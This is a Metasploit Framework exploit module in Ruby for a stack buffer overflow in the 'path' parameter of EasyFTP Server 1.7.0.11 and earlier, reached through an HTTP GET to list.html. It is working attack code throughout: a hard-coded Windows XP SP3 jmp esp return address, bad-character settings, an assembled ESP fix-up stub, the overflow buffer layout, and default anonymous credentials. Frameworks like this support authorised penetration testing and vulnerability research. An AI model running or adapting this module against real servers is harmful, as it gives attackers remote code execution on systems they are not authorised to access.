##
# $Id: easyftp_list.rb 10024 2010-08-17 01:35:03Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /Easy-Web Server\// ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EasyFTP Server <= 1.7.0.11 list.html path Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11
				and earlier. EasyFTP fails to check input size when parsing the 'path' parameter
				supplied to an HTTP GET request, which leads to a stack based buffer overflow.
				EasyFTP allows anonymous access by default; valid credentials are typically
				unnecessary to exploit this vulnerability.

				After version 1.7.0.12, this package was renamed "UplusFtp".

				Due to limited space, as well as difficulties using an egghunter, the use of
				staged, ORD, and/or shell payloads is recommended.
			},
			'Author'         =>
				[
					'ThE g0bL!N',   # Original exploit [see References]
					'jduck'         # Metasploit re-implementation
				],
			'Version'        => '$Revision: 10024 $',
			'References'     =>
				[
					[ 'OSVDB', '66614'],
					[ 'URL', 'http://www.exploit-db.com/exploits/11500/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 256,
					'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20\x23\x25\x26\x2b\x2f\x3b\x3f\x5c",
					'Compat'   =>
					{
						'ConnectionType' => '+ws2ord',
					},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[	'Windows XP SP3 - Easy FTP Server Universal',
						# NOTE: It's not possible to use addresses within the
						# binary due to the nul byte.
						{
							'Ret'      => 0x7cc5d507  # jmp esp in shell32.dll
							#'Ret'      => 0xdeadbeef
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 18 2010'
		))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('BasicAuthUser', [true, 'The HTTP username to specify for basic authentication', 'anonymous']),
				OptString.new('BasicAuthPass', [true, 'The HTTP password to specify for basic authentication', 'mozilla@example.com']),
			], self.class)
	end

	def check
		info = http_fingerprint  # check method
		if info and (info =~ /Easy-Web Server\//)
			return Exploit::CheckCode::Vulnerable
		end
		Exploit::CheckCode::Safe
	end


	def exploit
		if (payload.encoded.length > payload_space)
			raise RuntimeError, "Insufficient space for payload, try using a staged, ORD and/or shell payload."
		end

		# Fix up ESP, jmp to the beginning of the buffer
		stub_asm = %q{
			mov edi, esp
			add esp, 0xfffffc04
			add edi, 0xfffffee8
			jmp edi
		}
		stub = Metasm::Shellcode.assemble(Metasm::Ia32.new, stub_asm).encode_string

		# Build the path up
		path = ''
		path << payload.encoded
		path << rand_text(268 - path.length)
		# NOTE: It's possible to overwrite SEH, however SafeSEH is in effect.
		path << [target.ret].pack('V')
		path << rand_text(280 - path.length)
		path << stub
		path << rand_text(332 - path.length)

		uri = "/list.html?path="
		uri << path

		print_status("Trying target #{target.name}...")
		res = send_request_raw({ 'uri' => uri }, 5)

		if (res)
			print_error("The server unexpectedly responded, this is not good.")
			print_status(res.inspect)
		end

		handler
	end

end
